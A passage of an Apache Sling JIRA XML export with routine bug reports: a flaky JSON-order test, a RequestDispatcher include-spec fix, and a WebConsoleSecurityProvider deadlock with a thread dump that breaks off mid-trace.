                            <comment id="17646707" author="rombert" created="Tue, 13 Dec 2022 15:52:18 +0000"  >&lt;p&gt;Thanks for the report &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=prasad907109&quot; class=&quot;user-hover&quot; rel=&quot;prasad907109&quot;&gt;prasad907109&lt;/a&gt;. This does not look like a problem in Sling, but rather a problem with the interactions between the Jackrabbit JCR repository and your database. I suggest that you ask the &lt;a href=&quot;https://jackrabbit.apache.org/jcr/index.html&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;Apache Jackrabbit Project&lt;/a&gt; for assistance, probably on the users&apos; list.&lt;/p&gt;</comment>
                            <comment id="17646915" author="JIRAUSER298546" created="Wed, 14 Dec 2022 04:28:34 +0000"  >&lt;p&gt;Thanks &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=rombert&quot; class=&quot;user-hover&quot; rel=&quot;rombert&quot;&gt;rombert&lt;/a&gt; for the response. Please can you confirm, if this is the email ID &lt;span class=&quot;nobr&quot;&gt;&lt;a href=&quot;mailto:users@jackrabbit.apache.org&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;users@jackrabbit.apache.org&lt;sup&gt;&lt;img class=&quot;rendericon&quot; src=&quot;https://issues.apache.org/jira/images/icons/mail_small.gif&quot; height=&quot;12&quot; width=&quot;13&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;/sup&gt;&lt;/a&gt;&lt;/span&gt;, I need to send the issue details?&lt;/p&gt;</comment>
                            <comment id="17647003" author="rombert" created="Wed, 14 Dec 2022 09:10:34 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=prasad907109&quot; class=&quot;user-hover&quot; rel=&quot;prasad907109&quot;&gt;prasad907109&lt;/a&gt; - yes, that is the right mailing list.&lt;/p&gt;</comment>
                            <comment id="17647047" author="JIRAUSER298546" created="Wed, 14 Dec 2022 11:19:03 +0000"  >&lt;p&gt;Thanks for confirming &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=rombert&quot; class=&quot;user-hover&quot; rel=&quot;rombert&quot;&gt;rombert&lt;/a&gt;&#160;&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13514686">JCR-4887</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                            <attachment id="13053828" name="error-1.txt" size="571" author="prasad907109" created="Tue, 13 Dec 2022 11:42:44 +0000"/>
                            <attachment id="13053829" name="repository-datasource.xml" size="4812" author="prasad907109" created="Tue, 13 Dec 2022 11:43:33 +0000"/>
                            <attachment id="13053830" name="repository-jndi.xml" size="4882" author="prasad907109" created="Tue, 13 Dec 2022 11:43:33 +0000"/>
                            <attachment id="13053831" name="repository-org.xml" size="5582" author="prasad907109" created="Tue, 13 Dec 2022 11:43:33 +0000"/>
                            <attachment id="13053832" name="standalone.xml" size="47107" author="prasad907109" created="Tue, 13 Dec 2022 11:43:33 +0000"/>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>5.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 45 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1e02o:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11727] Do not rely on order of JSON attributes in test</title>
                <link>https://issues.apache.org/jira/browse/SLING-11727</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The tests &lt;b&gt;JsonRendererTest#testBooleansNoTidy&lt;/b&gt; and &lt;b&gt;JsonRendererTest#testBooleansNoTidy#testBooleansWithTidy&lt;/b&gt; passed using normal maven-test, but showed Non-deterministic behavior under NonDex(&lt;a href=&quot;https://github.com/TestingResearchIllinois/NonDex)&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/TestingResearchIllinois/NonDex)&lt;/a&gt; and thus failed. After some probing, I found the output from the test is not deterministic.&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;Steps to reproduce the failure:&lt;/p&gt;

&lt;p&gt;Install Nondex(&lt;a href=&quot;https://github.com/TestingResearchIllinois/NonDex)&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/TestingResearchIllinois/NonDex)&lt;/a&gt;&#160;in the environment.&#160;&lt;/p&gt;

&lt;p&gt;Then cd to nifi repository, and run the following:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
mvn install -pl . -am -DskipTests

mvn -pl . test -Dtest=org.apache.sling.servlets.get.impl.helpers.JsonRendererTest#testBooleansNoTidy

mvn -pl . edu.illinois:nondex-maven-plugin:2.1:nondex -Dtest=org.apache.sling.servlets.get.impl.helpers.JsonRendererTest#testBooleansNoTidy&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13512203">SLING-11727</key>
            <summary>Do not rely on order of JSON attributes in test</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="5" iconUrl="https://issues.apache.org/jira/images/icons/priorities/trivial.svg">Trivial</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="priyanka_a">Priyanka Awatramani</reporter>
                        <labels>
                    </labels>
                <created>Sun, 11 Dec 2022 10:46:56 +0000</created>
                <updated>Sun, 8 Oct 2023 08:26:27 +0000</updated>
                            <resolved>Thu, 15 Dec 2022 21:17:19 +0000</resolved>
                                                    <fixVersion>Servlets Get 2.2.0</fixVersion>
                                    <component>Servlets</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="8400">2h 20m</timespent>
                                <comments>
                            <comment id="17648250" author="kwin" created="Thu, 15 Dec 2022 21:17:19 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-servlets-get/commit/bbf043e6d39f1fcc752311f64d858f43b4f2cd4e&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-servlets-get/commit/bbf043e6d39f1fcc752311f64d858f43b4f2cd4e&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=priyanka_a&quot; class=&quot;user-hover&quot; rel=&quot;priyanka_a&quot;&gt;priyanka_a&lt;/a&gt; Thanks for the PR.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 44 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1dswg:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11722] The SlingRequestDispatcher doesn&apos;t correctly implement the RequestDispatcher API</title>
                <link>https://issues.apache.org/jira/browse/SLING-11722</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The &lt;tt&gt;include&lt;/tt&gt; method &lt;span class=&quot;error&quot;&gt;&amp;#91;0&amp;#93;&lt;/span&gt; has the following important sentence in its documentation:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The ServletResponse object has its path elements and parameters remain unchanged from the caller&apos;s. The included servlet cannot change the response status code or set headers; any attempt to make a change is ignored.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;However, the &lt;tt&gt;SlingRequestDispatcher&lt;/tt&gt; &lt;span class=&quot;error&quot;&gt;&amp;#91;1&amp;#93;&lt;/span&gt; doesn&apos;t enforce this in any way.&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;error&quot;&gt;&amp;#91;0&amp;#93;&lt;/span&gt; - &lt;a href=&quot;https://docs.oracle.com/javaee/7/api/javax/servlet/RequestDispatcher.html#include-javax.servlet.ServletRequest-javax.servlet.ServletResponse-&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://docs.oracle.com/javaee/7/api/javax/servlet/RequestDispatcher.html#include-javax.servlet.ServletRequest-javax.servlet.ServletResponse-&lt;/a&gt;&lt;br/&gt;
&lt;span class=&quot;error&quot;&gt;&amp;#91;1&amp;#93;&lt;/span&gt; - &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-engine/blob/bbc6acca70e7a27386f47fa9733af3740985f375/src/main/java/org/apache/sling/engine/impl/request/SlingRequestDispatcher.java#L177&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-engine/blob/bbc6acca70e7a27386f47fa9733af3740985f375/src/main/java/org/apache/sling/engine/impl/request/SlingRequestDispatcher.java#L177&lt;/a&gt;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13510023">SLING-11722</key>
            <summary>The SlingRequestDispatcher doesn&apos;t correctly implement the RequestDispatcher API</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="radu">Radu Cotescu</assignee>
                                    <reporter username="radu">Radu Cotescu</reporter>
                        <labels>
                    </labels>
                <created>Tue, 6 Dec 2022 08:58:49 +0000</created>
                <updated>Wed, 16 Oct 2024 12:55:49 +0000</updated>
                            <resolved>Tue, 21 Feb 2023 13:24:57 +0000</resolved>
                                                    <fixVersion>Engine 2.14.0</fixVersion>
                                    <component>Engine</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="6600">1h 50m</timespent>
                                <comments>
                            <comment id="17645173" author="radu.cotescu" created="Fri, 9 Dec 2022 08:45:36 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-engine/commit/5d8df33&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;commit 5d8df33&lt;/a&gt; and commit &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-engine/commit/ece93401392f7fb3b75b02af62d392e75120d245&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;ece93401&lt;/a&gt;.&lt;/p&gt;</comment>
                            <comment id="17691516" author="cziegeler" created="Tue, 21 Feb 2023 10:50:38 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=radu&quot; class=&quot;user-hover&quot; rel=&quot;radu&quot;&gt;radu&lt;/a&gt; Is there still work required or can this be resolved?&lt;/p&gt;</comment>
                            <comment id="17691602" author="radu.cotescu" created="Tue, 21 Feb 2023 13:24:07 +0000"  >&lt;p&gt;This should be good to go from the POV of the spec. When the two new configs are enabled it might affect scripts written in JSP, since that engine sets by default a content type. Depending on the request&apos;s rendering chain some JSP scripts might need to be refactored.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13475550">SLING-11514</issuekey>
        </issuelink>
                            </outwardlinks>
                                                                <inwardlinks description="is related to">
                                        <issuelink>
            <issuekey id="13595327">SLING-12454</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 35 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1dfg8:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11717] Sling WebConsoleSecurityProvider extension seems to deadlock in certain cases - Dupe</title>
                <link>https://issues.apache.org/jira/browse/SLING-11717</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
Found one Java-level deadlock:
=============================
&lt;span class=&quot;code-quote&quot;&gt;&quot;FelixDispatchQueue&quot;&lt;/span&gt;:
  waiting to lock monitor 7f8a5595d180 (object 7f8b03e7, a org.apache.sling.extensions.webconsolesecurityprovider.internal.ServicesListener$Listener),
  which is held by &lt;span class=&quot;code-quote&quot;&gt;&quot;Apache Sling Repository Startup &lt;span class=&quot;code-object&quot;&gt;Thread&lt;/span&gt; #1&quot;&lt;/span&gt;
&lt;span class=&quot;code-quote&quot;&gt;&quot;Apache Sling Repository Startup &lt;span class=&quot;code-object&quot;&gt;Thread&lt;/span&gt; #1&quot;&lt;/span&gt;:
  waiting to lock monitor 7f8a5595d180 (object 45551fe9, a org.apache.sling.extensions.webconsolesecurityprovider.internal.ServicesListener),
  which is held by &lt;span class=&quot;code-quote&quot;&gt;&quot;FelixDispatchQueue&quot;&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The issue seems to be in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-extensions-webconsolesecurityprovider/blob/fd7f0e9e4e287ceb72211ee2e08e55568713ddbd/src/main/java/org/apache/sling/extensions/webconsolesecurityprovider/internal/ServicesListener.java&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-extensions-webconsolesecurityprovider/blob/fd7f0e9e4e287ceb72211ee2e08e55568713ddbd/src/main/java/org/apache/sling/extensions/webconsolesecurityprovider/internal/ServicesListener.java&lt;/a&gt; and it could very well be that the last commit was the cause&lt;img class=&quot;emoticon&quot; src=&quot;https://issues.apache.org/jira/images/icons/emoticons/help_16.png&quot; height=&quot;16&quot; width=&quot;16&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt;. &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-extensions-webconsolesecurityprovider/commit/fd7f0e9e4e287ceb72211ee2e08e55568713ddbd&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-extensions-webconsolesecurityprovider/commit/fd7f0e9e4e287ceb72211ee2e08e55568713ddbd&lt;/a&gt; &lt;/p&gt;


&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
Java stack information &lt;span class=&quot;code-keyword&quot;&gt;for&lt;/span&gt; the threads listed above:
===================================================
&lt;span class=&quot;code-quote&quot;&gt;&quot;FelixDispatchQueue&quot;&lt;/span&gt; prio=5 tid=0xd nid=0xffffffff waiting &lt;span class=&quot;code-keyword&quot;&gt;for&lt;/span&gt; monitor entry
   java.lang.&lt;span class=&quot;code-object&quot;&gt;Thread&lt;/span&gt;.State: BLOCKED
	at org.apache.sling.extensions.webconsolesecurityprovider.internal.ServicesListener$Listener.getService(ServicesListener.java:247)
	- waiting to lock &amp;lt;0x7f8b03e7&amp;gt; (a org.apache.sling.extensions.webconsolesecurityprovider.internal.ServicesListener$Listener) owned by &lt;span class=&quot;code-quote&quot;&gt;&quot;Apache Sling Repository Startup &lt;span class=&quot;code-object&quot;&gt;Thread&lt;/span&gt; #1&quot;&lt;/span&gt; tid=0x80
	at org.apache.sling.extensions.webconsolesecurityprovider.internal.ServicesListener.notifyChange(ServicesListener.java:121)
	- locked &amp;lt;0x45551fe9&amp;gt; (a org.apache.sling.extensions.webconsolesecurityprovider.internal.ServicesListener)
	at org.apache.sling.extensions.webconsolesecurityprovider.internal.ServicesListener.startupFinished(ServicesListener.java:105)
	at org.apache.sling.launchpad.base.impl.DefaultStartupHandler.startupFinished(DefaultStartupHandler.java:366)
	at org.apache.sling.launchpad.base.impl.DefaultStartupHandler.frameworkEvent(DefaultStartupHandler.java:287)
	at org.apache.felix.framework.EventDispatcher.invokeFrameworkListenerCallback(EventDispatcher.java:881)
	at org.apache.felix.framework.EventDispatcher.fireEventImmediately(EventDispatcher.java:830)
	at org.apache.felix.framework.EventDispatcher.run(EventDispatcher.java:1147)
	at org.apache.felix.framework.EventDispatcher.access$000(EventDispatcher.java:54)
	at org.apache.felix.framework.EventDispatcher$1.run(EventDispatcher.java:102)
	at java.base@11.0.16.1/java.lang.&lt;span class=&quot;code-object&quot;&gt;Thread&lt;/span&gt;.run(&lt;span class=&quot;code-object&quot;&gt;Thread&lt;/span&gt;.java:834)
&lt;span class=&quot;code-quote&quot;&gt;&quot;Apache Sling Repository Startup &lt;span class=&quot;code-object&quot;&gt;Thread&lt;/span&gt; #1&quot;&lt;/span&gt; daemon prio=5 tid=0x50 nid=0xffffffff waiting &lt;span class=&quot;code-keyword&quot;&gt;for&lt;/span&gt; monitor entry
   java.lang.&lt;span class=&quot;code-object&quot;&gt;Thread&lt;/span&gt;.State: BLOCKED
	at org.apache.sling.extensions.webconsolesecurityprovider.internal.ServicesListener.notifyChange(ServicesListener.java:121)
	- waiting to lock &amp;lt;0x45551fe9&amp;gt; (a org.apache.sling.extensions.webconsolesecurityprovider.internal.ServicesListener) owned by &lt;span class=&quot;code-quote&quot;&gt;&quot;FelixDispatchQueue&quot;&lt;/span&gt; tid=0x13
	at org.apache.sling.extensions.webconsolesecurityprovider.internal.ServicesListener$Listener.retainService(ServicesListener.java:270)
	- locked &amp;lt;0x7f8b03e7&amp;gt; (a org.apache.sling.extensions.webconsolesecurityprovider.internal.ServicesListener$Listener)
	at org.apache.sling.extensions.webconsolesecurityprovider.internal.ServicesListener$Listener.serviceChanged(ServicesListener.java:295)
	at org.apache.felix.framework.EventDispatcher.invokeServiceListenerCallback(EventDispatcher.java:990)
	at org.apache.felix.framework.EventDispatcher.fireEventImmediately(EventDispatcher.java:838)
	at org.apache.felix.framework.EventDispatcher.fireServiceEvent(EventDispatcher.java:545)
	at org.apache.felix.framework.Felix.fireServiceEvent(Felix.java:4833)
	at org.apache.felix.framework.Felix.registerService(Felix.java:3804)
	at org.apache.felix.framework.BundleContextImpl.registerService(BundleContextImpl.java:328)
	at org.apache.felix.scr.impl.manager.AbstractComponentManager$3.register(AbstractComponentManager.java:907)
	at org.apache.felix.scr.impl.manager.AbstractComponentManager$3.register(AbstractComponentManager.java:893)
	at org.apache.felix.scr.impl.manager.RegistrationManager.changeRegistration(RegistrationManager.java:128)
	at org.apache.felix.scr.impl.manager.AbstractComponentManager.registerService(AbstractComponentManager.java:960)
	at org.apache.felix.scr.impl.manager.AbstractComponentManager.activateInternal(AbstractComponentManager.java:733)
	at org.apache.felix.scr.impl.manager.DependencyManager$SingleStaticCustomizer.addedService(DependencyManager.java:1091)
	at org.apache.felix.scr.impl.manager.DependencyManager$SingleStaticCustomizer.addedService(DependencyManager.java:1043)
	at org.apache.felix.scr.impl.manager.ServiceTracker$Tracked.customizerAdded(ServiceTracker.java:1216)
	at org.apache.felix.scr.impl.manager.ServiceTracker$Tracked.customizerAdded(ServiceTracker.java:1137)
	at org.apache.felix.scr.impl.manager.ServiceTracker$AbstractTracked.trackAdding(ServiceTracker.java:944)
	at org.apache.felix.scr.impl.manager.ServiceTracker$AbstractTracked.track(ServiceTracker.java:880)
	at org.apache.felix.scr.impl.manager.ServiceTracker$Tracked.serviceChanged(ServiceTracker.java:1168)
	at org.apache.felix.scr.impl.BundleComponentActivator$ListenerInfo.serviceChanged(BundleComponentActivator.java:125)
	at org.apache.felix.framework.EventDispatcher.invokeServiceListenerCallback(EventDispatcher.java:990)
	at org.apache.felix.framework.EventDispatcher.fireEventImmediately(EventDispatcher.java:838)
	at org.apache.felix.framework.EventDispatcher.fireServiceEvent(EventDispatcher.java:545)
	at org.apache.felix.framework.Felix.fireServiceEvent(Felix.java:4833)
	at org.apache.felix.framework.Felix.registerService(Felix.java:3804)
	at org.apache.felix.framework.BundleContextImpl.registerService(BundleContextImpl.java:328)
	at org.apache.felix.framework.BundleContextImpl.registerService(BundleContextImpl.java:501)
	at org.apache.sling.resourceresolver.impl.ResourceResolverFactoryActivator.registerFactory(ResourceResolverFactoryActivator.java:519)
	at org.apache.sling.resourceresolver.impl.ResourceResolverFactoryActivator.checkFactoryPreconditions(ResourceResolverFactoryActivator.java:582)
	at org.apache.sling.resourceresolver.impl.ResourceResolverFactoryActivator.access$100(ResourceResolverFactoryActivator.java:68)
	at org.apache.sling.resourceresolver.impl.ResourceResolverFactoryActivator$1.providerAdded(ResourceResolverFactoryActivator.java:416)
	at org.apache.sling.resourceresolver.impl.providers.ResourceProviderTracker.register(ResourceProviderTracker.java:217)
	at org.apache.sling.resourceresolver.impl.providers.ResourceProviderTracker.access$200(ResourceProviderTracker.java:59)
	at org.apache.sling.resourceresolver.impl.providers.ResourceProviderTracker$1.addingService(ResourceProviderTracker.java:130)
	at org.apache.sling.resourceresolver.impl.providers.ResourceProviderTracker$1.addingService(ResourceProviderTracker.java:106)
	at org.osgi.util.tracker.ServiceTracker$Tracked.customizerAdding(ServiceTracker.java:943)
	at org.osgi.util.tracker.ServiceTracker$Tracked.customizerAdding(ServiceTracker.java:871)
	at org.osgi.util.tracker.AbstractTracked.trackAdding(AbstractTracked.java:256)
	at org.osgi.util.tracker.AbstractTracked.track(AbstractTracked.java:229)
	at org.osgi.util.tracker.ServiceTracker$Tracked.serviceChanged(ServiceTracker.java:903)
	at org.apache.felix.framework.EventDispatcher.invokeServiceListenerCallback(EventDispatcher.java:990)
	at org.apache.felix.framework.EventDispatcher.fireEventImmediately(EventDispatcher.java:838)
